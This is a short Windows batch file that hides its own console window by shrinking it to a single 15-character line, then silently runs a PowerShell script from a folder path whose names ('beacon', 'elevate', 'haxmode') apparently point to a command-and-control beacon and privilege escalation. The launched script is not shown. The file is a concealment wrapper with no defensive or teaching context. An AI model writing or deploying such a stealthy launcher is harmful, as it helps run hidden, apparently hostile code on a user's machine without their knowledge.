@echo off
mode con: cols=15 lines=1
powershell -File "C:\temp\beacon\elevate\haxmode.ps1" -ErrorAction SilentlyContinue
